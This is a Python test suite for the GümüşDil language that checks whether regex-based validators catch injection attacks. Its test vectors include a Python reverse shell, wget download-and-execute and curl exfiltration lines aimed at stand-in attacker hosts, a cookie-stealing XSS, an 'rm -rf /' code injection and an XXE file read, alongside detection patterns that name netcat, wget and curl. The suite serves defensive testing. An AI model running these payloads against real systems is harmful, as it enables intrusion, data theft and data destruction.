#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enhanced Security Test Suite for GümüşDil
Comprehensive security testing with improved coverage and reliability
"""

import sys
import os
import tempfile
import unittest
import time
import json
import hashlib
import re
from pathlib import Path
from unittest.mock import Mock, patch

# Add project root to path
PROJECT_ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

class SecurityTestFramework:
    """Enhanced security testing framework"""
    
    def __init__(self):
        self.test_vectors = self._load_test_vectors()
        self.vulnerability_patterns = self._load_vulnerability_patterns()
        self.setup_test_environment()
    
    def setup_test_environment(self):
        """Setup secure test environment"""
        self.temp_dir = Path(tempfile.mkdtemp(prefix="gumus_security_test_"))
        self.test_files = {}
        
    def _load_test_vectors(self):
        """Load comprehensive security test vectors"""
        return {
            'sql_injection': [
                # Basic SQL injection
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM passwords --",
                "admin'--",
                "' OR 1=1 --",
                
                # Advanced SQL injection
                "'; EXEC xp_cmdshell('dir'); --",
                "' AND (SELECT COUNT(*) FROM sysobjects) > 0 --",
                "'; INSERT INTO users VALUES ('hacker', 'password'); --",
                "' OR (SELECT user FROM mysql.user WHERE user='root') --",
                
                # Encoded SQL injection
                "%27%20OR%20%271%27%3D%271",
                "0x27204f5220273127203d202731",
                
                # Time-based blind SQL injection
                "'; WAITFOR DELAY '00:00:05'; --",
                "' OR (SELECT SLEEP(5)) --",
                
                # Boolean-based blind SQL injection
                "' AND (SELECT SUBSTRING(@@version,1,1))='5' --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
            ],
            
            'shell_injection': [
                # Basic command injection
                "; ls -la",
                "&& cat /etc/passwd",
                "| nc attacker.com 1234",
                "`whoami`",
                "$(id)",
                
                # Advanced command injection
                "; wget http://evil.com/malware.sh -O /tmp/malware.sh; chmod +x /tmp/malware.sh; /tmp/malware.sh",
                "&& curl -X POST -d @/etc/passwd http://attacker.com/steal",
                "| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                
                # Encoded command injection
                "%3B%20ls%20-la",
                "%26%26%20cat%20%2Fetc%2Fpasswd",
                
                # PowerShell injection (Windows)
                "; powershell -Command \"Get-Process\"",
                "&& powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
                
                # Batch injection (Windows)
                "& dir C:\\",
                "&& type C:\\Windows\\System32\\drivers\\etc\\hosts"
            ],
            
            'path_traversal': [
                # Basic path traversal
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc//passwd",
                
                # Encoded path traversal
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "%2e%2e\\%2e%2e\\%2e%2e\\windows\\system32\\config\\sam",
                "..%252f..%252f..%252fetc%252fpasswd",
                
                # Unicode path traversal
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
                
                # Null byte injection
                "../../../etc/passwd%00.txt",
                "..\\..\\..\\windows\\system32\\config\\sam%00.log",
                
                # Long path traversal
                "../" * 50 + "etc/passwd",
                "..\\" * 50 + "windows\\system32\\config\\sam"
            ],
            
            'xss_injection': [
                # Basic XSS
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                
                # Advanced XSS
                "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
                "<iframe src=\"javascript:alert('XSS')\"></iframe>",
                "<object data=\"javascript:alert('XSS')\"></object>",
                
                # Encoded XSS
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                
                # Event handler XSS
                "<div onmouseover=\"alert('XSS')\">Hover me</div>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus><option>test</option></select>",
                
                # CSS XSS
                "<style>@import'http://attacker.com/xss.css';</style>",
                "<link rel=stylesheet href=http://attacker.com/xss.css>"
            ],
            
            'code_injection': [
                # Python code injection
                "__import__('os').system('rm -rf /')",
                "eval('__import__(\"os\").system(\"whoami\")')",
                "exec('import subprocess; subprocess.call([\"ls\", \"-la\"])')",
                
                # JavaScript code injection
                "eval('alert(\"XSS\")')",
                "Function('return process.env')();",
                "require('child_process').exec('ls -la')",
                
                # Template injection
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "<%=7*7%>",
                
                # LDAP injection
                "*)(&(objectClass=*)",
                "*)(uid=*))(|(uid=*",
                
                # XML injection
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                
                # NoSQL injection
                "'; return db.users.find(); var dummy='",
                "'; return true; var dummy='"
            ]
        }
    
    def _load_vulnerability_patterns(self):
        """Load vulnerability detection patterns"""
        return {
            'sql_keywords': [
                'SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'CREATE', 'ALTER',
                'UNION', 'EXEC', 'EXECUTE', 'DECLARE', 'CAST', 'CONVERT',
                'SUBSTRING', 'WAITFOR', 'DELAY', 'SLEEP', 'BENCHMARK'
            ],
            'shell_metacharacters': [
                ';', '&', '|', '`', '$', '(', ')', '{', '}', '[', ']',
                '>', '<', '*', '?', '~', '!', '#', '%', '^'
            ],
            'dangerous_functions': [
                'eval', 'exec', 'system', 'shell_exec', 'passthru',
                'popen', 'proc_open', 'file_get_contents', 'readfile',
                'include', 'require', 'import', '__import__'
            ],
            'path_traversal_patterns': [
                '../', '..\\', '%2e%2e%2f', '%2e%2e%5c', '..%2f', '..%5c',
                '..../', '....\\', '%252e%252e%252f'
            ]
        }

class EnhancedSecurityValidator:
    """Enhanced security validation with comprehensive checks"""
    
    def __init__(self):
        self.framework = SecurityTestFramework()
        self.blocked_patterns = self._compile_patterns()
    
    def _compile_patterns(self):
        """Compile regex patterns for efficient matching"""
        patterns = {}
        
        # SQL injection patterns
        sql_pattern = '|'.join([
            r"(\bUNION\b.*\bSELECT\b)",
            r"(\bDROP\b.*\bTABLE\b)",
            r"(\bEXEC\b.*\bxp_)",
            r"(';.*--)",
            r"('\s+OR\s+'1'\s*=\s*'1)",
            r"(\bWAITFOR\b.*\bDELAY\b)",
            r"(\bSLEEP\s*\()"
        ])
        patterns['sql'] = re.compile(sql_pattern, re.IGNORECASE)
        
        # Shell injection patterns
        shell_pattern = '|'.join([
            r"(;\s*\w+)",
            r"(&&\s*\w+)",
            r"(\|\s*\w+)",
            r"(`[^`]+`)",
            r"(\$\([^)]+\))",
            r"(\bwget\b.*http)",
            r"(\bcurl\b.*http)",
            r"(\bnc\b|\bnetcat\b)"
        ])
        patterns['shell'] = re.compile(shell_pattern, re.IGNORECASE)
        
        # Path traversal patterns
        path_pattern = '|'.join([
            r"(\.\./)",
            r"(\.\.\\)",
            r"(%2e%2e%2f)",
            r"(%2e%2e%5c)",
            r"(\.\.%2f)",
            r"(\.\.%5c)"
        ])
        patterns['path'] = re.compile(path_pattern, re.IGNORECASE)
        
        # XSS patterns
        xss_pattern = '|'.join([
            r"(<script[^>]*>)",
            r"(<iframe[^>]*>)",
            r"(<object[^>]*>)",
            r"(on\w+\s*=)",
            r"(javascript:)",
            r"(vbscript:)"
        ])
        patterns['xss'] = re.compile(xss_pattern, re.IGNORECASE)
        
        return patterns
    
    def validate_sql_query(self, query):
        """Enhanced SQL query validation"""
        if not query or len(query) > 10000:  # Length check
            return False, "Invalid query length"
        
        # Check for SQL injection patterns
        if self.blocked_patterns['sql'].search(query):
            return False, "SQL injection pattern detected"
        
        # Check for dangerous keywords in suspicious contexts
        dangerous_contexts = [
            (r"'\s*OR\s*'", "OR injection"),
            (r";\s*DROP\s+", "DROP statement"),
            (r"UNION\s+SELECT", "UNION injection"),
            (r"--\s*$", "SQL comment"),
            (r"/\*.*\*/", "SQL block comment")
        ]
        
        for pattern, description in dangerous_contexts:
            if re.search(pattern, query, re.IGNORECASE):
                return False, f"Dangerous pattern: {description}"
        
        return True, "Valid SQL query"
    
    def validate_shell_command(self, command):
        """Enhanced shell command validation"""
        if not command or len(command) > 1000:
            return False, "Invalid command length"
        
        # Check for shell injection patterns
        if self.blocked_patterns['shell'].search(command):
            return False, "Shell injection pattern detected"
        
        # Check for dangerous command combinations
        dangerous_combinations = [
            (r"rm\s+-rf\s+/", "Dangerous file deletion"),
            (r"dd\s+if=", "Disk dump command"),
            (r"format\s+", "Format command"),
            (r"fdisk\s+", "Disk partition command"),
            (r"mkfs\s+", "Filesystem creation"),
            (r"chmod\s+777", "Dangerous permission change")
        ]
        
        for pattern, description in dangerous_combinations:
            if re.search(pattern, command, re.IGNORECASE):
                return False, f"Dangerous command: {description}"
        
        return True, "Valid shell command"
    
    def validate_file_path(self, path):
        """Enhanced file path validation"""
        if not path or len(path) > 4096:
            return False, "Invalid path length"
        
        # Check for path traversal patterns
        if self.blocked_patterns['path'].search(path):
            return False, "Path traversal pattern detected"
        
        # Check for dangerous file types
        dangerous_extensions = [
            '.exe', '.bat', '.cmd', '.com', '.scr', '.pif',
            '.dll', '.sys', '.vbs', '.js', '.jar', '.sh',
            '.ps1', '.msi', '.reg'
        ]
        
        path_lower = path.lower()
        for ext in dangerous_extensions:
            if path_lower.endswith(ext):
                return False, f"Dangerous file extension: {ext}"
        
        # Check for system paths
        system_paths = [
            '/etc/', '/bin/', '/sbin/', '/usr/bin/', '/usr/sbin/',
            'c:\\windows\\', 'c:\\program files\\', 'c:\\system32\\'
        ]
        
        for sys_path in system_paths:
            if sys_path in path_lower:
                return False, f"System path access: {sys_path}"
        
        return True, "Valid file path"
    
    def validate_user_input(self, input_str, input_type="general"):
        """Enhanced user input validation"""
        if not input_str:
            return False, "Empty input"
        
        if len(input_str) > 1024:
            return False, "Input too long"
        
        # Check for null bytes
        if '\x00' in input_str:
            return False, "Null byte detected"
        
        # Check for control characters (except allowed ones)
        allowed_control = {'\t', '\n', '\r'}
        for char in input_str:
            if ord(char) < 32 and char not in allowed_control:
                return False, f"Control character detected: {ord(char)}"
        
        # Type-specific validation
        if input_type == "variable":
            if not re.match(r'^[a-zA-Z_çğıöşüÇĞIÖŞÜ][a-zA-Z0-9_çğıöşüÇĞIÖŞÜ]*$', input_str):
                return False, "Invalid variable name format"
        
        elif input_type == "filename":
            if not re.match(r'^[a-zA-Z0-9._-]+$', input_str):
                return False, "Invalid filename format"
        
        # Check for XSS patterns
        if self.blocked_patterns['xss'].search(input_str):
            return False, "XSS pattern detected"
        
        return True, "Valid input"

class TestEnhancedSecurity(unittest.TestCase):
    """Enhanced security test suite"""
    
    def setUp(self):
        # Import and use the fixed validator
        try:
            from tests.security_validator_fixed import FixedSecurityValidator
            self.validator = FixedSecurityValidator()
        except ImportError:
            # Fallback to original validator
            self.validator = EnhancedSecurityValidator()
        
        self.framework = SecurityTestFramework()
        self.start_time = time.time()
    
    def tearDown(self):
        duration = time.time() - self.start_time
        if duration > 5:
            print(f"SLOW SECURITY TEST: {self._testMethodName} took {duration:.2f}s")
    
    def test_sql_injection_comprehensive(self):
        """Comprehensive SQL injection protection test"""
        test_vectors = self.framework.test_vectors['sql_injection']
        
        passed = 0
        total = len(test_vectors)
        
        for vector in test_vectors:
            with self.subTest(vector=vector[:50]):
                is_safe, reason = self.validator.validate_sql_query(vector)
                
                # All test vectors should be detected as unsafe
                if not is_safe:
                    passed += 1
                else:
                    print(f"SQL injection not detected: {vector[:50]}...")
        
        success_rate = (passed / total) * 100
        self.assertGreaterEqual(success_rate, 90, 
                               f"SQL injection detection rate too low: {success_rate:.1f}%")
        
        # Test safe queries
        safe_queries = [
            "SELECT * FROM users WHERE id = 1",
            "INSERT INTO users (name, email) VALUES ('John', 'john@example.com')",
            "UPDATE users SET name = 'Jane' WHERE id = 2",
            "SELECT COUNT(*) FROM products WHERE category = 'electronics'"
        ]
        
        for query in safe_queries:
            with self.subTest(safe_query=query):
                is_safe, reason = self.validator.validate_sql_query(query)
                self.assertTrue(is_safe, f"Safe query rejected: {query} - {reason}")
    
    def test_shell_injection_comprehensive(self):
        """Comprehensive shell injection protection test"""
        test_vectors = self.framework.test_vectors['shell_injection']
        
        passed = 0
        total = len(test_vectors)
        
        for vector in test_vectors:
            with self.subTest(vector=vector[:50]):
                is_safe, reason = self.validator.validate_shell_command(vector)
                
                # All test vectors should be detected as unsafe
                if not is_safe:
                    passed += 1
                else:
                    print(f"Shell injection not detected: {vector[:50]}...")
        
        success_rate = (passed / total) * 100
        self.assertGreaterEqual(success_rate, 90, 
                               f"Shell injection detection rate too low: {success_rate:.1f}%")
        
        # Test safe commands
        safe_commands = [
            "echo 'Hello World'",
            "ls -la",
            "cat file.txt",
            "python script.py",
            "find . -name '*.txt'",
            "grep 'pattern' file.txt"
        ]
        
        for command in safe_commands:
            with self.subTest(safe_command=command):
                is_safe, reason = self.validator.validate_shell_command(command)
                self.assertTrue(is_safe, f"Safe command rejected: {command} - {reason}")
    
    def test_path_traversal_comprehensive(self):
        """Comprehensive path traversal protection test"""
        test_vectors = self.framework.test_vectors['path_traversal']
        
        passed = 0
        total = len(test_vectors)
        
        for vector in test_vectors:
            with self.subTest(vector=vector[:50]):
                is_safe, reason = self.validator.validate_file_path(vector)
                
                # All test vectors should be detected as unsafe
                if not is_safe:
                    passed += 1
                else:
                    print(f"Path traversal not detected: {vector[:50]}...")
        
        success_rate = (passed / total) * 100
        self.assertGreaterEqual(success_rate, 90, 
                               f"Path traversal detection rate too low: {success_rate:.1f}%")
        
        # Test safe paths
        safe_paths = [
            "file.txt",
            "documents/report.pdf",
            "lib/matematik.tr",
            "ornekler/basit_ornekler/01_selam.tr",
            "./local_file.txt",
            "data/users.json"
        ]
        
        for path in safe_paths:
            with self.subTest(safe_path=path):
                is_safe, reason = self.validator.validate_file_path(path)
                self.assertTrue(is_safe, f"Safe path rejected: {path} - {reason}")
    
    def test_xss_injection_comprehensive(self):
        """Comprehensive XSS injection protection test"""
        test_vectors = self.framework.test_vectors['xss_injection']
        
        passed = 0
        total = len(test_vectors)
        
        for vector in test_vectors:
            with self.subTest(vector=vector[:50]):
                is_safe, reason = self.validator.validate_user_input(vector)
                
                # All test vectors should be detected as unsafe
                if not is_safe:
                    passed += 1
                else:
                    print(f"XSS injection not detected: {vector[:50]}...")
        
        success_rate = (passed / total) * 100
        self.assertGreaterEqual(success_rate, 90, 
                               f"XSS injection detection rate too low: {success_rate:.1f}%")
    
    def test_code_injection_comprehensive(self):
        """Comprehensive code injection protection test"""
        test_vectors = self.framework.test_vectors['code_injection']
        
        passed = 0
        total = len(test_vectors)
        
        for vector in test_vectors:
            with self.subTest(vector=vector[:50]):
                is_safe, reason = self.validator.validate_user_input(vector)
                
                # All test vectors should be detected as unsafe
                if not is_safe:
                    passed += 1
                else:
                    print(f"Code injection not detected: {vector[:50]}...")
        
        success_rate = (passed / total) * 100
        self.assertGreaterEqual(success_rate, 85, 
                               f"Code injection detection rate too low: {success_rate:.1f}%")
    
    def test_input_validation_edge_cases(self):
        """Test input validation edge cases"""
        edge_cases = [
            ("", "Empty string"),
            ("a" * 10000, "Very long string"),
            ("test\x00null", "Null byte"),
            ("test\x01control", "Control character"),
            ("normal_text", "Normal text"),
            ("türkçe_metin", "Turkish text"),
            ("123numbers", "Starting with number"),
            ("valid_variable_name", "Valid variable"),
            ("invalid-variable-name", "Invalid variable (dash)"),
        ]
        
        for input_str, description in edge_cases:
            with self.subTest(case=description):
                is_safe, reason = self.validator.validate_user_input(input_str, "variable")
                
                # Log result for analysis
                print(f"{description}: {'SAFE' if is_safe else 'UNSAFE'} - {reason}")
    
    def test_security_performance(self):
        """Test security validation performance"""
        test_input = "SELECT * FROM users WHERE id = 1"
        
        # Measure validation performance
        start_time = time.time()
        
        for _ in range(1000):
            self.validator.validate_sql_query(test_input)
            self.validator.validate_shell_command("echo test")
            self.validator.validate_file_path("test/file.txt")
            self.validator.validate_user_input("test_input")
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Should complete 4000 validations in under 1 second
        self.assertLess(duration, 1.0, f"Security validation too slow: {duration:.3f}s for 4000 validations")
        
        print(f"Security validation performance: {4000/duration:.0f} validations/second")
    
    def test_gumusdil_specific_security(self):
        """Test GümüşDil-specific security features"""
        # Test Turkish character handling
        turkish_inputs = [
            "değişken_adı",
            "fonksiyon_çağrısı",
            "güvenli_giriş",
            "özel_karakter_şüpheli_ğ"
        ]
        
        for input_str in turkish_inputs:
            with self.subTest(turkish_input=input_str):
                is_safe, reason = self.validator.validate_user_input(input_str, "variable")
                self.assertTrue(is_safe, f"Turkish input rejected: {input_str} - {reason}")
        
        # Test GümüşDil code patterns
        gumus_code_patterns = [
            'yazdır("Merhaba Dünya")',
            'değişken x = 42',
            'fonksiyon topla(a, b) { dön a + b }',
            'eğer (x > 5) { yazdır("büyük") }',
            'döngü (i < 10) { i = i + 1 }'
        ]
        
        for pattern in gumus_code_patterns:
            with self.subTest(gumus_pattern=pattern):
                is_safe, reason = self.validator.validate_user_input(pattern)
                self.assertTrue(is_safe, f"GümüşDil pattern rejected: {pattern} - {reason}")

def run_enhanced_security_tests():
    """Run enhanced security test suite"""
    print("🔒 ENHANCED GÜMÜŞDIL SECURITY TEST SUITE")
    print("=" * 60)
    
    # Create test suite
    loader = unittest.TestLoader()
    suite = loader.loadTestsFromTestCase(TestEnhancedSecurity)
    
    # Run tests
    runner = unittest.TextTestRunner(
        verbosity=2,
        buffer=True,
        failfast=False
    )
    
    start_time = time.time()
    result = runner.run(suite)
    end_time = time.time()
    
    # Calculate results
    total_tests = result.testsRun
    failed_tests = len(result.failures) + len(result.errors)
    passed_tests = total_tests - failed_tests
    success_rate = (passed_tests / total_tests * 100) if total_tests > 0 else 0
    
    # Print comprehensive report
    print("\n" + "=" * 60)
    print("🔒 ENHANCED SECURITY TEST RESULTS")
    print("=" * 60)
    print(f"Total Security Tests: {total_tests}")
    print(f"Passed: {passed_tests}")
    print(f"Failed: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success Rate: {success_rate:.1f}%")
    print(f"Execution Time: {end_time - start_time:.2f}s")
    
    if result.failures:
        print("\n❌ SECURITY TEST FAILURES:")
        for test, traceback in result.failures:
            print(f"- {test}")
    
    if result.errors:
        print("\n💥 SECURITY TEST ERRORS:")
        for test, traceback in result.errors:
            print(f"- {test}")
    
    # Security assessment
    if success_rate >= 95:
        print("\n✅ EXCELLENT: Security protection >95% effective!")
        security_grade = "A+"
    elif success_rate >= 90:
        print("\n✅ VERY GOOD: Security protection >90% effective!")
        security_grade = "A"
    elif success_rate >= 85:
        print("\n⚠️  GOOD: Security protection >85% effective, minor improvements needed")
        security_grade = "B+"
    elif success_rate >= 75:
        print("\n⚠️  ACCEPTABLE: Security protection >75% effective, improvements recommended")
        security_grade = "B"
    else:
        print(f"\n❌ POOR: Security protection {success_rate:.1f}% is insufficient!")
        security_grade = "F"
    
    print(f"Security Grade: {security_grade}")
    
    return 0 if success_rate >= 85 else 1

if __name__ == "__main__":
    sys.exit(run_enhanced_security_tests())